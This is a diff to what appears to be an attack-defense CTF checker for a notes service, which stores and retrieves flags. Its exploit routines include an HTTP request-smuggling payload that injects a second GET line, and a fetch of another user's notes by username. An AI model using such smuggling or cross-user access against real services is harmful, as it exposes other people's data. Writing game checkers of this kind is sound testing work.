@@ -82,8 +82,8 @@ async def do_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, tok
         logger.error(f"Caught another exception, {k.msg}")
     return None
 
-async def do_notes(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, token: str = None, username: str = None, password: str = None) -> None:
-    path = "/notes"
+async def do_notes(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, userToSearch:str, token: str = None, username: str = None, password: str = None) -> None:
+    path = f"/notes/{userToSearch}"
     if token is None:
         token = await do_login(task, logger, username, password)
     status, headers, body = await do_get(task.address, PORT, path, {"x-token":token})
@@ -160,7 +160,7 @@ async def putflag_enc(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, db
     privateKey = await do_register(task, logger, username, password)
     token = await do_login(task, logger, username, password)
     await do_addnote(task, logger, task.flag, token=token)
-    await db.set("infopflag", token)
+    await db.set("infopflag", (token, username))
     await db.set("privateKeypflag", privateKey)
     return username
 
@@ -191,11 +191,11 @@ async def getflag(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, db: Ch
 @checker.getflag(1)
 async def getflag_enc(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB) -> None:
     try:
-        token = await db.get("infopflag")
+        token, username = await db.get("infopflag")
         privateKey = await db.get("privateKeypflag")
     except KeyError:
         raise MumbleException("Database info missing")
-    r = await do_notes(task, logger, token=token)
+    r = await do_notes(task, logger, username, token=token)
     if "data" in r:
         if len(r["data"]) != 0:
             foundFlag = False
@@ -226,7 +226,6 @@ async def getflag_enc(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, db
 
 @checker.putnoise(0)
 async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
-    return
     username = noise(10, 20)
     password = noise(10, 20)
     await do_register(task, logger, username, password)
@@ -237,7 +236,6 @@ async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, db: 
 
 @checker.getnoise(0)
 async def getnoise(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
-    return
     try:
         token, phone = await db.get("info1")
     except KeyError:
@@ -264,7 +262,6 @@ async def havoc_safado(task: HavocCheckerTaskMessage, logger: LoggerAdapter, db:
 
 @checker.havoc(1)
 async def havoc_hacker(task: HavocCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
-    return
     path = "/login"
     username = noise(10, 20)
     password = noise(10, 20)
@@ -278,7 +275,6 @@ async def havoc_healthcheck(task: HavocCheckerTaskMessage, logger: LoggerAdapter
 
 @checker.putnoise(1)
 async def putnoise_enc(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB) -> str:
-    return
     username = noise(10, 20)
     password = noise(10, 20)
     privateKey = await do_register(task, logger, username, password)
@@ -292,13 +288,12 @@ async def putnoise_enc(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, 
 
 @checker.getnoise(1)
 async def getnoise_check_note(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB) -> None:
-    return
     try:
         token, uname = await db.get("infopnoise")
         privateKey, noteFromDB = await db.get("privateKeypnoise")
     except KeyError:
         raise MumbleException("Database info missing")
-    r = await do_notes(task, logger, token=token)
+    r = await do_notes(task, logger, uname, token=token)
     if "data" in r and "curve" in r:
         CurveInfo = r["curve"]
         if len(r["data"]) != 0 and "a" in CurveInfo and "b" in CurveInfo and "p" in CurveInfo and "gx" in CurveInfo and "gy" in CurveInfo:
@@ -355,7 +350,7 @@ async def exploit_simple_smugling(task: ExploitCheckerTaskMessage, logger: Logge
     await do_register(task, logger, username, password)
     token = await do_login(task, logger, username, password)
     path = f"/user/{username_to_hack}"
-    true_path = "/ HTTP/1.1\r\nHost: localhost\r\n\r\nGET " + path
+    true_path = "/ HTTP/1.1\r\nHost: localhost\r\n\r\nGET " + path #Request smuggling
     status, headers, body = await do_request_fakepath(task.address, PORT, "GET", path, true_path, {"x-token":token}, None)
     assert_status_code(logger, path, status, headers, body, code=200)
 
@@ -374,7 +369,7 @@ async def exploit_smart_attack(task: ExploitCheckerTaskMessage, logger: LoggerAd
 
     await do_register(task, logger, username, password)
     token = await do_login(task, logger, username, password)
-    r = await do_notes(task, logger, token=token)
+    r = await do_notes(task, logger, username_to_hack, token=token)
     if "data" in r:
         if len(r["data"]) != 0:
             for i in range(len(r["data"])):
